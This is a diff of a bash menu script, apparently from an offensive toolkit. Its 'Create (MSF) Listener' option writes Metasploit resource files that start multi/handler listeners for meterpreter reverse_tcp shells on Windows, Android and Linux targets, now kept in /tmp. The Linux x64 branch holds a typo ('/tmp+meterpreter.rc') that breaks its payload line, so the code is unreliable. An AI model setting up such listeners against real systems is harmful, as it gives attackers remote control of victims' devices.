@@ -110,7 +110,6 @@ echo
 			echo -e ${Yellow}
 			;;
 		"Create (MSF) Listener"*)
-			service postgresql start
 			echo -e ${Red}
 			echo -e "For :"
 			echo -e "1) Windows" 
@@ -122,53 +121,54 @@ echo
 			read -p "Host IP : " listener_ip
 			read -p "Port No. : " listener_port
 			echo -e
+			
 			sudo service postgresql start
 			case $listener_os in
 			1*)			
-			touch meterpreter.rc
-			echo -e " " > meterpreter.rc
-			echo -e "use multi/handler" >> meterpreter.rc
-			echo -e "set PAYLOAD windows/meterpreter/reverse_tcp" >> meterpreter.rc
-			echo -e "set LHOST $listener_ip">> meterpreter.rc
-			echo -e "set LPORT $listener_port">> meterpreter.rc
-			echo -e "exploit" >> meterpreter.rc
-			msfconsole -r meterpreter.rc
+			touch /tmp/meterpreter.rc
+			echo -e " " > /tmp/meterpreter.rc
+			echo -e "use multi/handler" >> /tmp/meterpreter.rc
+			echo -e "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/meterpreter.rc
+			echo -e "set LHOST $listener_ip">> /tmp/meterpreter.rc
+			echo -e "set LPORT $listener_port">> /tmp/meterpreter.rc
+			echo -e "exploit" >> /tmp/meterpreter.rc
+			msfconsole -r /tmp/meterpreter.rc
 			echo -e ${Yellow}
 			;;
 
 			2*)
-			touch meterpreter.rc
-			echo -e " " > meterpreter.rc
-			echo -e "use multi/handler" >> meterpreter.rc
-			echo -e "set PAYLOAD android/meterpreter/reverse_tcp" >> meterpreter.rc
-			echo -e "set LHOST $listener_ip">> meterpreter.rc
-			echo -e "set LPORT $listener_port">> meterpreter.rc
-			echo -e "exploit" >> meterpreter.rc
-			msfconsole -r meterpreter.rc
+			touch /tmp/meterpreter.rc
+			echo -e " " > /tmp/meterpreter.rc
+			echo -e "use multi/handler" >> /tmp/meterpreter.rc
+			echo -e "set PAYLOAD android/meterpreter/reverse_tcp" >> /tmp/meterpreter.rc
+			echo -e "set LHOST $listener_ip">> /tmp/meterpreter.rc
+			echo -e "set LPORT $listener_port">> /tmp/meterpreter.rc
+			echo -e "exploit" >> /tmp/meterpreter.rc
+			msfconsole -r /tmp/meterpreter.rc
 			echo -e ${Yellow}
 			;;
 
 			3*)
-			touch meterpreter.rc
-			echo -e " " > meterpreter.rc
-			echo -e "use multi/handler" >> meterpreter.rc
-			echo -e "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> meterpreter.rc
-			echo -e "set LHOST $listener_ip">> meterpreter.rc
-			echo -e "set LPORT $listener_port">> meterpreter.rc
-			echo -e "exploit" >> meterpreter.rc
-			msfconsole -r meterpreter.rc
+			touch /tmp/meterpreter.rc
+			echo -e " " > /tmp/meterpreter.rc
+			echo -e "use multi/handler" >> /tmp/meterpreter.rc
+			echo -e "set PAYLOAD linux/x86/meterpreter/reverse_tcp" >> /tmp/meterpreter.rc
+			echo -e "set LHOST $listener_ip">> /tmp/meterpreter.rc
+			echo -e "set LPORT $listener_port">> /tmp/meterpreter.rc
+			echo -e "exploit" >> /tmp/meterpreter.rc
+			msfconsole -r /tmp/meterpreter.rc
 			echo -e ${Yellow}			
 			;;
 
 			4*)
-			touch meterpreter.rc
-			echo -e " " > meterpreter.rc
-			echo -e "use multi/handler" >> meterpreter.rc
-			echo -e "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> meterpreter.rc
-			echo -e "set LHOST $listener_ip">> meterpreter.rc
-			echo -e "set LPORT $listener_port">> meterpreter.rc
-			echo -e "exploit" >> meterpreter.rc
-			msfconsole -r meterpreter.rc
+			touch /tmp/meterpreter.rc
+			echo -e " " > /tmp/meterpreter.rc
+			echo -e "use multi/handler" >> /tmp/meterpreter.rc
+			echo -e "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> /tmp+meterpreter.rc
+			echo -e "set LHOST $listener_ip">> /tmp/meterpreter.rc
+			echo -e "set LPORT $listener_port">> /tmp/meterpreter.rc
+			echo -e "exploit" >> /tmp/meterpreter.rc
+			msfconsole -r /tmp/meterpreter.rc
 			echo -e ${Yellow}			
 			;;
 	
@@ -222,7 +222,7 @@ echo
 			echo
 			echo -e "Aborting"			
 			echo
-			exit 0
+			exit 0			
 			break
 			;;
 	esac
